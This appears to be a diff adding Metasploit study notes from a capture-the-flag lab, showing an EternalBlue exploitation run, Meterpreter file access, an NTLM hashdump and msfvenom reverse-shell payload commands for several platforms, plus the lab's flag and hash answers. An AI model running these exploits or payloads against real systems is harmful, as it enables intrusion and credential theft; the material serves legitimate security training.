@@ -318,6 +318,233 @@ search type:auxiliary smtp open
 use auxiliary/scanner/smtp/smtp_relay 
 info
 ```
+## Eploitation
+
+
+- **search <keyword>** → Find exploits  
+- **info** → Get details about an exploit  
+- **exploit** (or **run**) → Launch exploit  
+
+Most exploits have a default payload, but you can list others with:  
+- **show payloads**
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
+```
+Once you have decided on the payload, you can use the set payload command to make your choice.
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 2
+```
+
+Some payloads will open new parameters that you may need to set, running the **show options** command once more can show these. As you can see in the above example, a reverse payload will at least require you to set the **LHOST** option.
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.186.44
+```
+
+
+Once a session is opened, you can background it using **CTRL+Z** or abort it using **CTRL+C**. Backgrounding a session will be useful when working on more than one target simultaneously or on the same target with a different exploit and/or shell.
+
+```bash
+C:\Windows\system32>^Z
+Background session 1? [y/N]  y
+```
+** Working with sessions**
+he sessions command will list all active sessions. The sessions command supports a number of options that will help you manage sessions better.
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -h
+```
+
+You can interact with any existing session using the **sessions -i** command followed by the session ID.
+
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
+```
+
+## Q&A
+Exploit one of the critical vulnerabilities on the target VM
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.201.90.115
+RHOSTS => 10.201.90.115
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.201.100.126
+LHOST => 10.201.100.126
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+[*] Started reverse TCP handler on 10.201.100.126:4444 
+[*] 10.201.90.115:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[-] 10.201.90.115:445     - An SMB Login Error occurred while connecting to the IPC$ tree.
+[*] 10.201.90.115:445     - Scanned 1 of 1 hosts (100% complete)
+[-] 10.201.90.115:445 - The target is not vulnerable.
+[*] Exploit completed, but no session was created.
+```
+
+What is the content of the flag.txt file?
+THM-5455554845
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.201.114.103
+RHOST => 10.201.114.103
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.201.100.126
+LHOST => 10.201.100.126
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+[*] Started reverse TCP handler on 10.201.100.126:4444 
+[*] 10.201.114.103:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.201.114.103:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.201.114.103:445    - Scanned 1 of 1 hosts (100% complete)
+[+] 10.201.114.103:445 - The target is vulnerable.
+[*] 10.201.114.103:445 - Connecting to target for exploitation.
+[+] 10.201.114.103:445 - Connection established for exploitation.
+[+] 10.201.114.103:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.201.114.103:445 - CORE raw buffer dump (42 bytes)
+[*] 10.201.114.103:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.201.114.103:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.201.114.103:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.201.114.103:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.201.114.103:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.201.114.103:445 - Sending all but last fragment of exploit packet
+[*] 10.201.114.103:445 - Starting non-paged pool grooming
+[+] 10.201.114.103:445 - Sending SMBv2 buffers
+[+] 10.201.114.103:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.201.114.103:445 - Sending final SMBv2 buffers.
+[*] 10.201.114.103:445 - Sending last fragment of exploit packet!
+[*] 10.201.114.103:445 - Receiving response from exploit packet
+[+] 10.201.114.103:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.201.114.103:445 - Sending egg to corrupted connection.
+[*] 10.201.114.103:445 - Triggering free of corrupted buffer.
+[*] Sending stage (203846 bytes) to 10.201.114.103
+[*] Meterpreter session 1 opened (10.201.100.126:4444 -> 10.201.114.103:49178) at 2025-08-24 16:50:17 +0100
+[+] 10.201.114.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.201.114.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.201.114.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+meterpreter > search -f flag.txt
+Found 1 result...
+=================
+
+Path                             Size (bytes)  Modified (UTC)
+----                             ------------  --------------
+c:\Users\Jon\Documents\flag.txt  15            2021-07-15 03:39:25 +0100
+
+meterpreter > cd c:\Users\Jon\Documents
+[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
+meterpreter > cd Users
+[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
+meterpreter > cd C:\\Users\\Jon\\Documents
+meterpreter > ls
+Listing: C:\Users\Jon\Documents
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Music
+040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Pictures
+040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Videos
+100666/rw-rw-rw-  402   fil   2018-12-13 03:13:48 +0000  desktop.ini
+100666/rw-rw-rw-  15    fil   2021-07-15 03:39:25 +0100  flag.txt
+
+meterpreter > cat flag.txt
+THM-5455554845
+```
+
+What is the NTLM hash of the password of the user "pirate"?8ce9a3ebd1647fcc5e04025019f4b875
+```bash
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/windows/gather/hashdump
+msf6 post(windows/gather/hashdump) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.201.100.126:4444 -> 10.201.114.103:49178 (10
+                                                                   .201.114.103)
+
+msf6 post(windows/gather/hashdump) > set SESSION 1
+SESSION => 1
+msf6 post(windows/gather/hashdump) > run
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+No users with password hints on this system
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::
+
+
+[*] Post module execution completed
+```
+
+## msfvenom
+```bash
+root@ip-10-10-186-44:~# msfvenom -l payloads 
+
+Framework Payloads (562 total) [--payload ]
+==================================================
+```
+
+**Output formats**
+You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). Themsfvenom --list formats command can be used to list supported output formats
+
+**Encoders**
+Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the **-e** parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was **raw**.
+```bash
+root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
+```
+
+**Handlers**
+
+
+Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the payload options title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.
+
+The following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). For the exercises in this task, you will need to replicate a similar scenario on another target system, DVWA was used here for illustration purposes. The exploit steps are;
+
+Generate the PHP shell using MSFvenom
+Start the Metasploit handler
+Execute the PHP shell
+MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of the AttackBox used in the attack and local port 7777 was chosen.
+
+```bash
+root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
+```
+Linux Executable and Linkable Format (elf)
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.
+
+Windows
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+```
+PHP
+```bash
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+```
+ASP
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+```
+Python
+```bash
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+```
+
+
+
+
+
 
 
 
